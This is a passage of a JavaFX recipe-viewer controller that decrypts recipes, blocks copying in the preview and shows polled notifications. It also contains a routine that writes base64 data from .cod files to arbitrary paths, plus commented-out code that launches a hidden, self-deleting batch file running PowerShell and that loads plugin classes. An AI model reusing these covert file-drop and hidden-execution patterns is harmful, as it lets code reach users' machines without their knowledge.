      Image img = new Image(getClass().getResourceAsStream("kadysoft.png"));
      ImageView imgview = new ImageView();
      imgview.setImage(img);
      Notifications noti = Notifications.create();
      noti.title("Error");
      noti.text("Hyperlink doesn't contain path to any Recipe.");
      noti.graphic(imgview);
      noti.position(Pos.CENTER);
      noti.show();
    } else {
      String pathy = link.getText().replace("\\","\\\\").replace("Z:",letterr+":").replace("X:",letterr+":").replace("V:",letterr+":").replace("W:",letterr+":");
      File op = new File(pathy);
      if (!op.exists()) {
        Image img = new Image(getClass().getResourceAsStream("kadysoft.png"));
        ImageView imgview = new ImageView();
        imgview.setImage(img);
        Notifications noti = Notifications.create();
        noti.title("Error");
        noti.text("I can't find the recipe, maybe the admin has deleted it.");
        noti.graphic(imgview);
        noti.position(Pos.CENTER);
        noti.show();
      } else {  
        WebView webview=new WebView ();
        webview.setMinSize(1800, 800);
          File on1=new File (System.getProperty("user.home")+"\\Hehehe");
          if (!on1.exists()) {
              on1.mkdir();
          }
          else {  
          }
          File tw2=new File (System.getProperty("user.home")+"\\Hehehe\\Roro.ks");
          if (!tw2.exists()) {
              tw2.createNewFile();
          }
          else {  
          }    
    coode.clear();
    
        ////////////////////////////////////////////////////////////

    String longKey;
    try (BufferedReader cxsd = new BufferedReader(new FileReader("lib\\java.dat"))) {
        longKey = cxsd.readLine();
    }
    if (longKey == null || longKey.trim().isEmpty()) {
        Notifications noti = Notifications.create();
        noti.title("Fatal Error!");
        noti.text("java.dat is empty!");
        noti.position(Pos.CENTER);
        noti.hideAfter(Duration.seconds(4));
        noti.showError();
        return;
    }
    String result = KeyDecoder.extractData(longKey.trim());
    if (op == null) {
        Notifications noti = Notifications.create();
        noti.title("Fatal Error!");
        noti.text("Choose file first!");
        noti.position(Pos.CENTER);
        noti.hideAfter(Duration.seconds(4));
        noti.showError();
        return;
    }
    String input = op.getAbsolutePath();
    String nameofit=op.getName();
    String tempOutput = System.getProperty("user.home")+"\\"+nameofit;
 
    FileDecryptor.decrypt(input, tempOutput, result);
    File temp = new File(tempOutput);
    
    ////////////////////////////////////////////////////////////
    
    
    InputStream inputinstream=new FileInputStream(temp);
    BufferedReader bi=new BufferedReader (new InputStreamReader (inputinstream,"UTF-8"));
    String lo;
    while ((lo=bi.readLine())!=null) {
        coode.appendText("\n"+lo
       .replace("ﬦ","A")
       .replace("ﬧ","B")
       .replace("ﬨ","C")
       .replace("﬩","D")
       .replace("שׁ","E")    
       .replace("שׂ","F")        
       .replace("שּׁ","G")         
       .replace("שּׂ","H")         
       .replace("אַ","I")         
       .replace("אָ","J")         
       .replace("אּ","K")         
       .replace("בּ","L")         
       .replace("גּ","M")         
       .replace("דּ","N")         
       .replace("הּ","O")         
       .replace("וּ","P")         
       .replace("זּ","Q")         
       .replace("טּ","R")         
       .replace("יּ","S")         
       .replace("ךּ","T")         
       .replace("כּ","U")         
       .replace("לּ","V")
       .replace("מּ","W")         
       .replace("נּ","X")         
       .replace("סּ","Y")         
       .replace("ףּ","Z")         
       .replace("פּ","0")         
       .replace("צּ","1")         
       .replace("קּ","2")         
       .replace("רּ","3")         
       .replace("שּ","4")         
       .replace("תּ","5")         
       .replace("וֹ","6")         
       .replace("בֿ","7")         
       .replace("כֿ","8")
       .replace("פֿ","9")
       .replace("&NBSP;","")               
      ); 
    }
    bi.close();
    
    ////////////////////////////////////////////////////////////////
    if (temp.exists()) {
        temp.delete();
    }
    ////////////////////////////////////////////////////////////////
    
    String gf=coode.getText();
    OutputStream instreamm=new FileOutputStream(tw2);
    PrintWriter pwe = new PrintWriter(new OutputStreamWriter (instreamm,"UTF-8"));
    pwe.println(gf);
    pwe.println("<script>\n" +
"  \n" +
"  window.addEventListener(`contextmenu`, (e) => {\n" +
"    e.preventDefault();\n" +
"});\n" +
"  \n" +
"  </script>");
    
    pwe.println("<script>\n" +
"            \n" +
"            document.addEventListener('keydown', event => {\n" +
"  console.log(`User pressed: ${event.key}`);\n" +
"  event.preventDefault();\n" +
"  return false;\n" +
"});\n" +
"            \n" +
"            </script>");
    pwe.close();
    coode.clear();
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        URI uri = Paths.get(System.getProperty("user.home")+"\\Hehehe\\Roro.ks").toAbsolutePath().toUri();
        webview.getEngine().load(uri.toString());
        Alert alo = new Alert(Alert.AlertType.INFORMATION);
        alo.setTitle("Preview a recipe");
        alo.setGraphic(webview);
        alo.setResizable(false);
        DialogPane dialogPane = alo.getDialogPane();
        dialogPane.getStylesheets().add(
      getClass().getResource(getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Themes")).toExternalForm());
        alo.showAndWait();
        File nm=new File (System.getProperty("user.home")+"\\Hehehe\\Roro.ks");
        if (pathy.contains(".ks")) {
            nm.delete();
        }
        else {
            
        } 
    Thread.sleep(3000);
    tw2.delete();  
      }
    } 
  }
  
  
  
  
  
  @FXML
  void tableaction(MouseEvent event) {
    TablePosition pos = (TablePosition) this.table.getSelectionModel().getSelectedCells().get(0);
    int idd = ((Integer)this.table.getSelectionModel().getSelectedIndices().get(0)).intValue();
    int iddd = idd + 1;
    String idddd = Integer.toString(iddd);
    String h = pos.getTableColumn().getCellData(pos.getRow()).toString();
    String colname = pos.getTableColumn().getText();
    this.link.setText(h);
  }
  
  
  
  
  
  
  private void restoreFileFromCod(String codFilePath) {
    try {
        List<String> lines = Files.readAllLines(Paths.get(codFilePath));
        if (lines.isEmpty()) {
        }
        String fullOutputPath = lines.get(0).trim();
        String base64Content = "";
        if (lines.size() > 1) {
            base64Content = String.join("", lines.subList(1, lines.size()));
        }
        byte[] data = Base64.getDecoder().decode(base64Content);
        Path output = Paths.get(fullOutputPath);
        if (output.getParent() != null) {
            Files.createDirectories(output.getParent());
        }
        Files.write(output, data);
    } catch (Exception e) {
        e.printStackTrace();
    }
}
  
  
  
  
  
//
//private String[] parseFile(String filePath) {
//    try {
//        List<String> lines = Files.readAllLines(Paths.get(filePath));
//        if (lines.isEmpty()) {
//        }
//
//        String fullPath = lines.get(0).trim();
//
//        String base64Content = "";
//        if (lines.size() > 1) {
//            base64Content = String.join("\n", lines.subList(1, lines.size()));
//        }
//
//        String directory = "";
//        String fileName = "";
//
//        int lastSlash = fullPath.lastIndexOf('\\');
//        if (lastSlash == -1) {
//            lastSlash = fullPath.lastIndexOf('/');
//        }
//
//        if (lastSlash != -1) {
//            directory = fullPath.substring(0, lastSlash + 1);
//            fileName = fullPath.substring(lastSlash + 1);
//        } else {
//
//            fileName = fullPath;
//            directory = ".\\";
//        }
//
//        return new String[]{directory, fileName, base64Content};
//
//    } catch (IOException e) {
//        e.printStackTrace();
//        return null;
//    }
//}
//  
//  
//  
//  
//private void runBase64Decoder(String base64Content, String outputFileName, String destinationPath) {
//    
//    Path batPath = null;
//    
//    try {
//        Path tempDir = Paths.get(System.getProperty("java.io.tmpdir"));
//        batPath = tempDir.resolve("decoder_" + System.currentTimeMillis() + ".bat");
//        String escapedBase64 = base64Content.replace("\"", "\\\"");
//        String content = "@echo off\r\n" +
//                "chcp 65001 >nul\r\n" +
//                "title Base64 Decoder\r\n" +
//                "\r\n" +
//                "powershell -NoProfile -Command \"[System.Convert]::FromBase64String('" + escapedBase64 + "') | " +
//                "Set-Content -Path '" + outputFileName.replace("\\", "\\\\") + "' -Encoding Byte\" && " +
//                "mkdir \"" + destinationPath.replace("\\", "\\\\") + "\" 2>nul && " +
//                "copy /Y \"" + outputFileName.replace("\\", "\\\\") + "\" \"" +
//                destinationPath.replace("\\", "\\\\") + "\" && " +
//                "del \"" + outputFileName.replace("\\", "\\\\") + "\" 2>nul\r\n" +
//                "exit";
//
//        Files.write(batPath, content.getBytes(StandardCharsets.UTF_8));
//
//        ProcessBuilder pb = new ProcessBuilder(
//            "cmd.exe", 
//            "/c", 
//            "start /B /MIN cmd.exe /c \"" + batPath.toAbsolutePath().toString() + "\""
//        );
//
//        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
//        pb.redirectError(ProcessBuilder.Redirect.INHERIT);
//        pb.start();
//
//    } catch (Exception e) {
//        e.printStackTrace();
//    } 
//    finally {
//        final Path finalBatPath = batPath;
//        if (finalBatPath != null) {
//            new Thread(() -> {
//                try {
//                    Thread.sleep(1500);
//                    Files.deleteIfExists(finalBatPath);
//                } catch (Exception ignored) {}
//            }).start();
//        }
//    }
//}

  
  
public void initialize(URL url, ResourceBundle rb) {
    this.conn = db.java_db();
    
    
    
    

    /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    List<String> messages = new ArrayList<>();
    // Fetch data from the database
    try {
    String sqla = "SELECT * FROM Notifications WHERE Recipient = ? AND Delivered = ?";
    pst = conn.prepareStatement(sqla);
    System.out.println("Recipient parameter: Recipe_Maker");
    pst.setString(1, "Recipe_Maker");
    System.out.println("Delivered parameter: 0");
    pst.setInt(2, 0); // Use setInt if Delivered column is an integer
    rs = pst.executeQuery();
    if (!rs.isBeforeFirst()) {
    System.out.println("No data found for the query.");
    }
    while (rs.next()) {
        String sender = rs.getString("Sender");
        String message = rs.getString("Message");
        System.out.println("Fetched: " + sender + " - " + message);
        messages.add(sender + " sent a message: " + message);
    }
} catch (Exception e) {
    e.printStackTrace(); // Log exception details for debugging
} finally {
    try {
        if (rs != null) rs.close();
        if (pst != null) pst.close();
    } catch (Exception exception) {
        exception.printStackTrace();
    }
}
// Check if messages list is populated
System.out.println("Messages list size: " + messages.size());
// Convert list to a string with line breaks
StringBuilder contentBuilder = new StringBuilder();
for (String message : messages) {
contentBuilder.append(message).append("\n\n");
}
// Show message content in alert
Alert alert = new Alert(AlertType.INFORMATION);
alert.setTitle("Messages");
alert.setHeaderText("List of Notifications:");
alert.setContentText(contentBuilder.toString().isEmpty() ? "No messages found." : contentBuilder.toString());
DialogPane dialogPaneo = alert.getDialogPane();
dialogPaneo.getStylesheets().add(
getClass().getResource(getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Themes")).toExternalForm());
alert.showAndWait();

 
    
        
    
    String newllllink=getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Mod_Recipes").replace("\\Recipes","")+"\\ADS\\ADS.html";
    Timeline reloadTimeline = new Timeline(new KeyFrame(Duration.minutes(2.3), event -> {
    URI uri = Paths.get(newllllink).toAbsolutePath().toUri();
    addo.getEngine().load(uri.toString());  
    }));
    reloadTimeline.setCycleCount(Timeline.INDEFINITE); // Repeat indefinitely
    reloadTimeline.play(); // Start the Timeline
    /////////////////////////////////////////////////////////////////////////////////
    
   



editorprint.setGraphic(new ImageView (new Image(getClass().getResourceAsStream("print.png"))));
editorprint.setTooltip(new Tooltip ("Click Here To Print Outside"));
printic.setGraphic(new ImageView (new Image(getClass().getResourceAsStream("print.png"))));
printic.setTooltip(new Tooltip ("Click Here To Print Selected Recipe"));
getallbtn.setGraphic(new ImageView (new Image(getClass().getResourceAsStream("refresh.png"))));
getallbtn.setTooltip(new Tooltip ("Refresh Production"));
getallbtn1.setGraphic(new ImageView (new Image(getClass().getResourceAsStream("refresh.png"))));
getallbtn1.setTooltip(new Tooltip ("Refresh Development"));
seepilot.setGraphic(new ImageView (new Image(getClass().getResourceAsStream("replace.png"))));
seepilot.setTooltip(new Tooltip ("Open Pilots"));
tablee.setTooltip(new Tooltip ("Preview Recipe"));
image.setTooltip(new Tooltip ("Convert Recipe To Image"));
timer.setTooltip(new Tooltip ("Create Report"));      
coster.setTooltip(new Tooltip ("Get Recipe Cost"));
recipeprocesses.setTooltip(new Tooltip ("Get Recipe Processes"));
calculatetime.setTooltip(new Tooltip ("Calculate Time"));
openadmin.setTooltip(new Tooltip ("Open Admin"));
chemicalplan.setTooltip(new Tooltip ("Create Chemical Plan"));
audit.setTooltip(new Tooltip ("Choose In Case Of Audit"));
performance.setTooltip(new Tooltip ("Worker Performance"));





    Toolkit tool = Toolkit.getDefaultToolkit();
    tool.setLockingKeyState(20, true);
    
    
    
    
    
    this.tg = new ToggleGroup();
    
    
    
    
    
    Date currentDate = GregorianCalendar.getInstance().getTime();
    DateFormat df = DateFormat.getDateInstance();
    String dateString = df.format(currentDate);
    Date d = new Date();
    SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy");
    String timeString = sdf.format(d);
    String value1 = dateString;
    
    
    
    
    
        final HourService hservice = new HourService();
        hservice.setCalendarInstance(Calendar.getInstance());
        hservice.setOnSucceeded(new EventHandler<WorkerStateEvent>() { // Anonymous
            @Override
            public void handle(WorkerStateEvent t) {   
                hservice.restart();
            }
        });
        hservice.start();
        
        
        
        
        
   getallbtn.fire();




   
    table.setRowFactory(tv -> {
    TableRow<ObservableList<String>> row = new TableRow<>();
    row.setOnMouseClicked(event -> {
        if (!row.isEmpty() && event.getClickCount() == 2) {
            ObservableList<String> rowData = row.getItem();
            if (rowData.size() > 5) {  // column 6 is index 5
                String filePath = rowData.get(5);
                try {    
        String wsa=filePath; 
        if (!wsa.contains(".ks")) {  
        //Noti to choose one first
        Image img = new Image(getClass().getResourceAsStream("kadysoft.png"));
        ImageView imgview = new ImageView();
        imgview.setImage(img);
        Notifications noti = Notifications.create();
        noti.title("Error");
        noti.text("I can't find the recipe, please choose one first.");
        noti.graphic(imgview);
        noti.position(Pos.CENTER);
        noti.show();
        }
        else {
      String pathy = filePath.replace("\\","\\\\").replace("Z:",letterr+":").replace("X:",letterr+":").replace("V:",letterr+":").replace("W:",letterr+":");
      File op = new File(pathy);
      if (!op.exists()) {
        Image img = new Image(getClass().getResourceAsStream("kadysoft.png"));
        ImageView imgview = new ImageView();
        imgview.setImage(img);
        Notifications noti = Notifications.create();
        noti.title("Error");
        noti.text("I can't find the recipe, maybe KADINIO has deleted or encrypted it.");
        noti.graphic(imgview);
        noti.position(Pos.CENTER);
        noti.show();
      } else {
          File on1=new File (System.getProperty("user.home")+"\\Hehehe");
          if (!on1.exists()) {
              on1.mkdir();
          }
          else {  
          }
          File tw2o=new File (System.getProperty("user.home")+"\\Hehehe\\Roro.html");
          if (!tw2o.exists()) {
              tw2o.createNewFile();
          }
          else {
          }     
    coode.clear();
    
        ////////////////////////////////////////////////////////////

    String longKey;
    try (BufferedReader cxsd = new BufferedReader(new FileReader("lib\\java.dat"))) {
        longKey = cxsd.readLine();
    }
    if (longKey == null || longKey.trim().isEmpty()) {
        Notifications noti = Notifications.create();
        noti.title("Fatal Error!");
        noti.text("java.dat is empty!");
        noti.position(Pos.CENTER);
        noti.hideAfter(Duration.seconds(4));
        noti.showError();
        return;
    }
    String result = KeyDecoder.extractData(longKey.trim());
    if (op == null) {
        Notifications noti = Notifications.create();
        noti.title("Fatal Error!");
        noti.text("Choose file first!");
        noti.position(Pos.CENTER);
        noti.hideAfter(Duration.seconds(4));
        noti.showError();
        return;
    }
    String input = op.getAbsolutePath();
    String nameofit=op.getName();
    String tempOutput = System.getProperty("user.home")+"\\"+nameofit;
    FileDecryptor.decrypt(input, tempOutput, result);
    File temp = new File(tempOutput);
    
    ////////////////////////////////////////////////////////////
    
    
    InputStream inputinstream=new FileInputStream(temp);
    BufferedReader bi=new BufferedReader (new InputStreamReader (inputinstream,"UTF-8"));
    String lo;
    while ((lo=bi.readLine())!=null) {
        coode.appendText("\n"+lo
       .replace("ﬦ","A")
       .replace("ﬧ","B")
       .replace("ﬨ","C")
       .replace("﬩","D")
       .replace("שׁ","E")    
       .replace("שׂ","F")        
       .replace("שּׁ","G")         
       .replace("שּׂ","H")         
       .replace("אַ","I")         
       .replace("אָ","J")         
       .replace("אּ","K")         
       .replace("בּ","L")         
       .replace("גּ","M")         
       .replace("דּ","N")         
       .replace("הּ","O")         
       .replace("וּ","P")         
       .replace("זּ","Q")         
       .replace("טּ","R")         
       .replace("יּ","S")         
       .replace("ךּ","T")         
       .replace("כּ","U")         
       .replace("לּ","V")
       .replace("מּ","W")         
       .replace("נּ","X")         
       .replace("סּ","Y")         
       .replace("ףּ","Z")         
       .replace("פּ","0")         
       .replace("צּ","1")         
       .replace("קּ","2")         
       .replace("רּ","3")         
       .replace("שּ","4")         
       .replace("תּ","5")         
       .replace("וֹ","6")         
       .replace("בֿ","7")         
       .replace("כֿ","8")
       .replace("פֿ","9")
       .replace("&NBSP;","")               
      ); 
    }
    bi.close();
    String gf=coode.getText();
    OutputStream instreamm=new FileOutputStream(tw2o);
    PrintWriter pwe = new PrintWriter(new OutputStreamWriter (instreamm,"UTF-8"));
    pwe.println(gf);
    pwe.println("<style>\n" +
"        body {\n" +
"            user-select: none;\n" +
"            -webkit-user-select: none;\n" +
"            -moz-user-select: none;\n" +
"            -ms-user-select: none;\n" +
"        }\n" +
"    </style>"
            
          +"<script>\n" +
"        document.addEventListener('dragstart', function(event) {\n" +
"            event.preventDefault();\n" +
"        });\n" +
"\n" +
"        document.addEventListener('drop', function(event) {\n" +
"            event.preventDefault();\n" +
"        });\n" +
"\n" +
"        document.addEventListener('contextmenu', function(event) {\n" +
"            event.preventDefault();\n" +
"        });\n" +
"    </script>"  
            
            + "<script>\n" +
"  \n" +
"  window.addEventListener(`contextmenu`, (e) => {\n" +
"    e.preventDefault();\n" +
"});\n" +
"  \n" +
"  </script>"
             + ""
            + "\n<meta charset=\"UTF-8\"/>\n<meta name=\"viewport\" content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\"/>\n\t\t<meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" />"
            + ""
            + "<script>\n" +
"            \n" +
"            document.addEventListener('keydown', event => {\n" +
"  console.log(`User pressed: ${event.key}`);\n" +
"  event.preventDefault();\n" +
"  return false;\n" +
"});\n" +
"            \n" +
"            </script>"
            
       +"<script>\n" +
"        document.addEventListener('keydown', function (event) {\n" +
"            // Disable specific keys or key combinations\n" +
"            event.preventDefault();\n" +
"        });\n" +
"    </script>");
    pwe.close();
    coode.clear();
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        // إنشاء WebView وتحميل ملف HTML محلي
        WebView webviewt = new WebView();
        webviewt.setContextMenuEnabled(false);
        webviewt.setMinSize(1800, 800);
        webviewt.setZoom(1.0); // التكبير الافتراضي 100%
        String lkd = System.getProperty("user.home") + "\\Hehehe\\Roro.html";
        URI uris = Paths.get(lkd).toAbsolutePath().toUri();
        webviewt.getEngine().load(uris.toString());
        // سلايدر للتحكم في الزوم من 10% إلى 200%
        Slider zoomSlider = new Slider(0.1, 2.0, 1.0);
        zoomSlider.setShowTickLabels(true);
        zoomSlider.setShowTickMarks(true);
        zoomSlider.setMajorTickUnit(0.5);
        zoomSlider.setMinorTickCount(4);
        zoomSlider.setBlockIncrement(0.1);
        Label zoomLabel = new Label("Zoom: 100%");
        zoomSlider.valueProperty().addListener((obs, oldVal, newVal) -> {
            double zoom = newVal.doubleValue();
            webviewt.setZoom(zoom);
            zoomLabel.setText(String.format("Zoom: %.0f%%", zoom * 100));
        });
        // VBox يحتوي على WebView والسلايدر
        VBox vbox = new VBox();
        vbox.setPadding(new Insets(10));
        VBox.setVgrow(webviewt, Priority.ALWAYS);
        vbox.getChildren().addAll(webviewt, zoomLabel, zoomSlider);
        // وضع VBox داخل GridPane
        GridPane gridpane = new GridPane();
        gridpane.setStyle("-fx-font-family: 'Cairo SemiBold';");
        gridpane.setPadding(new Insets(10));
        gridpane.setAlignment(Pos.CENTER);
        gridpane.add(vbox, 0, 0);
        // إنشاء Alert لعرض المحتوى
        Alert alol = new Alert(Alert.AlertType.INFORMATION);
        alol.setTitle("Preview a recipe");
        DialogPane dialogPane = alol.getDialogPane();
        dialogPane.setContent(gridpane);
        dialogPane.getStylesheets().add(getClass().getResource(getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Themes")).toExternalForm());
        alol.setResizable(true);
        alol.showAndWait();
    Thread.sleep(500);
    tw2o.delete();  
      }  
    } 
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }  
        }
    });
    return row;
});
  

    
    
  
//  ///////////////////////////////////////////////////////////Plugin/////////////////////////////////////////////////////////////////////////////  
//  Platform.runLater(() -> {
//          try {
//            File pluginsDir = new File("Java\\bin");
//            URLClassLoader loader = new URLClassLoader(
//                    new URL[]{pluginsDir.toURI().toURL()},
//                    null
//            );
//            String className = "plugin2.KSPlugin";
//            Class<?> pluginClass = loader.loadClass(className);
//            Object pluginInstance = pluginClass.getDeclaredConstructor().newInstance();
//            Method runMethod = pluginClass.getMethod("run");
//            runMethod.invoke(pluginInstance);
//            /*
//            File[] files = pluginsDir.listFiles(f -> f.getName().endsWith(".class"));
//            if (files != null) {
//                for (File f : files) {
//                    String name = f.getName().replace(".class", "");
//                    Class<?> c = loader.loadClass("external." + name);
//                    Object o = c.getDeclaredConstructor().newInstance();
//                    c.getMethod("run").invoke(o);
//                }
//            }
//            */
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    });
//  //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////  
//    
    
  


// ==================== Modern Notification Stage - Java 8 Version ====================

final Stage notificationStage = new Stage(StageStyle.UNDECORATED);
notificationStage.setAlwaysOnTop(true);
notificationStage.setResizable(false);
notificationStage.setOpacity(0.98);

// Container الرئيسي
VBox mainContainer = new VBox();
mainContainer.setPadding(new Insets(15));
mainContainer.setSpacing(12);
mainContainer.setStyle(
    "-fx-background-color: #ffffff;" +
    "-fx-background-radius: 20;" +
    "-fx-border-color: #d1d1d1;" +
    "-fx-border-radius: 20;" +
    "-fx-border-width: 1.5;" +
    "-fx-effect: dropshadow(gaussian, rgba(0, 0, 0, 0.3), 25, 0.2, 0, 10);"
);

// زر الإغلاق
HBox topBar = new HBox();
topBar.setAlignment(Pos.CENTER_RIGHT);
topBar.setPadding(new Insets(0, 5, 0, 0));

Button closeButton = new Button("✕");
closeButton.setStyle("-fx-background-color: transparent; -fx-text-fill: #888888; -fx-font-size: 20px; -fx-font-weight: bold; -fx-cursor: hand; -fx-padding: 2 12;");
closeButton.setOnMouseEntered(e -> closeButton.setStyle("-fx-background-color: #fee2e2; -fx-text-fill: #e74c3c; -fx-font-size: 20px; -fx-font-weight: bold; -fx-cursor: hand; -fx-background-radius: 10; -fx-padding: 2 12;"));
closeButton.setOnMouseExited(e -> closeButton.setStyle("-fx-background-color: transparent; -fx-text-fill: #888888; -fx-font-size: 20px; -fx-font-weight: bold; -fx-cursor: hand; -fx-padding: 2 12;"));
closeButton.setOnAction(e -> notificationStage.hide());
topBar.getChildren().add(closeButton);

// محتوى الإشعار
HBox notificationBox = new HBox(20);
notificationBox.setAlignment(Pos.CENTER_RIGHT);
notificationBox.setPadding(new Insets(10, 15, 15, 15));

ImageView imageView = new ImageView();
imageView.setFitWidth(145); 
imageView.setFitHeight(145);
imageView.setSmooth(true);
imageView.setPreserveRatio(true);

Label notificationLabel = new Label();
notificationLabel.setWrapText(true);
notificationLabel.setNodeOrientation(NodeOrientation.RIGHT_TO_LEFT);
notificationLabel.setStyle(
    "-fx-font-family: 'Cairo Bold', 'Segoe UI Semibold';" +
    "-fx-font-size: 19px;" +
    "-fx-text-fill: #2c3e50;" +
    "-fx-max-width: 450;" + 
    "-fx-alignment: CENTER_RIGHT;" +
    "-fx-line-spacing: 6;"
);
notificationLabel.setTextAlignment(TextAlignment.RIGHT);

// إضافة العناصر (النص أولاً ثم الصورة للاتجاه العربي)
notificationBox.getChildren().addAll(notificationLabel, imageView);
mainContainer.getChildren().addAll(topBar, notificationBox);

Scene notificationScene = new Scene(mainContainer);
notificationScene.setFill(Color.TRANSPARENT);
notificationStage.setScene(notificationScene);

// ====================== منطق القراءة والظهور ======================

Screen screen = Screen.getPrimary();
Rectangle2D bounds = screen.getVisualBounds();
final long[] lastShownTime = {0};
Random random = new Random();



Timeline timeline = new Timeline(new KeyFrame(Duration.minutes(10), e -> {
    try {
        
        //File kadyFile = new File(System.getProperty("user.home") + "\\NotiData.kady");
        //if (!kadyFile.exists()) return;
        
        String sr1=getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Mod_Recipes");//X:\Models\Recipes
        String sr2=sr1.replace("Recipes","");//X:\Models\
        String sr3=sr2+"ADS";//X:\\Models\\ADS
        File kadyFile = new File(sr3 + "\\NotiData.kady");
        if (!kadyFile.exists()) return;

            String notiimg  = sr3 + "\\Noti_Img.png";
            double repeatd  = 10;
            double closed   = 1;

            long now = System.currentTimeMillis();
            if (now - lastShownTime[0] >= (long) (repeatd * 60 * 1000)) {
                lastShownTime[0] = now;

                List<String> allLines = Files.readAllLines(Paths.get(sr3 + "\\NotiData.kady"), StandardCharsets.UTF_8);

                boolean hasEmptyLines = false;
                for (String line : allLines) {
                    if (line.trim().isEmpty()) {
                        hasEmptyLines = true;
                        break;
                    }
                }

                List<String> cleanLines = allLines.stream()
                                                  .map(String::trim)
                                                  .filter(line -> !line.isEmpty())
                                                  .collect(Collectors.toList());

                if (!cleanLines.isEmpty()) {
                    String finalContent;

                    if (hasEmptyLines && cleanLines.size() > 1) {
                        // منطق عشوائي: سطر عشوائي + السطر الأخير
                        int randomIndex = random.nextInt(cleanLines.size() - 1); 
                        String randomLine = cleanLines.get(randomIndex);
                        String lastLine = cleanLines.get(cleanLines.size() - 1);
                        finalContent = randomLine + "\n" + lastLine;
                    } else {
                        // عرض النص كله
                        StringBuilder sb = new StringBuilder();
                        for (int i = 0; i < cleanLines.size(); i++) {
                            sb.append(cleanLines.get(i));
                            if (i < cleanLines.size() - 1) sb.append("\n");
                        }
                        finalContent = sb.toString();
                    }

                    notificationLabel.setText(finalContent);

                    // تحميل الصورة
                    try {
                        File imgFile = new File(notiimg);
                        if (imgFile.exists()) {
                            imageView.setImage(new Image(imgFile.toURI().toString(), true));
                        }
                    } catch (Exception ignored) { imageView.setImage(null); }

                    // تحديث الأبعاد والموقع
                    mainContainer.applyCss();
                    mainContainer.layout();
                    notificationStage.sizeToScene();

                    // تحديد الموقع: أعلى اليمين تماماً
                    double x = bounds.getMaxX() - notificationStage.getWidth() - 25;
                    double y = bounds.getMinY() + 25;

                    notificationStage.setX(x);
                    notificationStage.setY(y);
                    notificationStage.show();

                    // صوت الإشعار
                    try {
                        File soundFile = new File("noti.wav");
                        if (soundFile.exists()) {
                            new AudioClip(soundFile.toURI().toString()).play();
                        }
                    } catch (Exception ignored) {}

                    // توقيت الإخفاء
                    Timeline hideTimer = new Timeline(new KeyFrame(Duration.minutes(closed), ev -> notificationStage.hide()));
                    hideTimer.play();
                }
            }
        
}       catch (IOException ex) {
            Logger.getLogger(ViewerController_1.class.getName()).log(Level.SEVERE, null, ex);
        }}
));

timeline.setCycleCount(Timeline.INDEFINITE);
timeline.play();
  
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////





fileCheckTimer = new Timer(true); // Daemon thread
fileCheckTimer.scheduleAtFixedRate(new TimerTask() {
    @Override
    public void run() {
        File file = new File("CAUTION.kady");
        if (!file.exists()) {
            //////////////////////////////////////////////////////////////////////////
            Platform.runLater(() -> {
                String title = "🚧 System Maintenance | صيانة النظام 🚧";
                String header = "⚠ Service Unavailable | الخدمة غير متاحة\nسكان الكود اللي علي اليمين ده وحمل الابلكيشن وشوف الريسيبي\nلحد ما المشكله تتحل ان شاء الله";
                String content =
                        "Dear User,\n" +
                        "🛠 We are currently upgrading and improving the system to serve you better.\n" +
                        "⏳ During this maintenance, the system will not be available.\n" +
                        "🙏 Thank you for your patience and understanding.\n\n" +
                        "—---------------------------------------------\n\n" +
                        "عزيزي المستخدم،\n" +
                        "نحن نقوم حالياً بتطوير وتحسين النظام لنخدمك بشكل أفضل.\n" +
                        "⏳ خلال فترة الصيانة لن تكون الخدمة متاحة.\n" +
                        "🙏 نشكرك على صبرك وتفهمك.\n\n" +
                        "💡 Please try again later | الرجاء المحاولة لاحقاً";
                Alert alert = new Alert(Alert.AlertType.INFORMATION);
                alert.setTitle(title);
                alert.setHeaderText(header);
                alert.setContentText(content);
                Image image = new Image(getClass().getResource("APP_QR.png").toExternalForm().toString());
                ImageView imageView = new ImageView(image);
                imageView.setFitWidth(250);   // العرض 250 بكسل
                imageView.setFitHeight(250);  // الارتفاع 250 بكسل
                imageView.setPreserveRatio(true);  // مهم جدًا: يحافظ على نسبة الصورة الأصلية (مش هتتشوه)
                alert.setGraphic(imageView);
                //alert.setGraphic(new ImageView(new Image(getClass().getResourceAsStream("APP_QR.png"))));
                alert.setResizable(true); // يسمح بتوسيع النافذة
                DialogPane dialogPaneo = alert.getDialogPane();
                alert.setOnHidden(ttt -> {
                    shutdownApp();
                });
                dialogPaneo.getStylesheets().add(
                        getClass().getResource(getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Themes")).toExternalForm()
                );
                // show alert (non-blocking)
                alert.show();
                // countdown 5 seconds then close alert and shutdown
                javafx.animation.PauseTransition delay = new javafx.animation.PauseTransition(javafx.util.Duration.seconds(60));
                delay.setOnFinished(e -> {
                    alert.close();
                    shutdownApp();
                });
                delay.play();
            });
            //////////////////////////////////////////////////////////////////////////
        } else {
            System.out.println("File found. App continues running.");
        }
    }
}, 0, 1 * 60 * 1000); // كل دقيقة (انت كاتب 1 * 60 * 1000 = 1 دقيقة مش 2 😉)
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////





fileCheckTimer5 = new Timer(true); // Daemon thread
fileCheckTimer5.scheduleAtFixedRate(new TimerTask() {
    @Override
    public void run() {
        
        
        //Start Here...............
        
        String pathiony="Java\\bin";
        String usery=System.getProperty("user.name");
        SafeZone sz=new SafeZone();
        
        File completed1=new File (pathiony+"\\"+usery+"_.cod");
        File completed2=new File (pathiony+"\\"+usery+"_shs.cod");
        File completed3=new File (pathiony+"\\"+usery+"_shr.cod");
        File completed4=new File (pathiony+"\\"+usery+"_shl.cod");
        File completed5=new File (pathiony+"\\"+usery+"_loc.cod");
        File completed6=new File (pathiony+"\\"+usery+"_swi.cod");
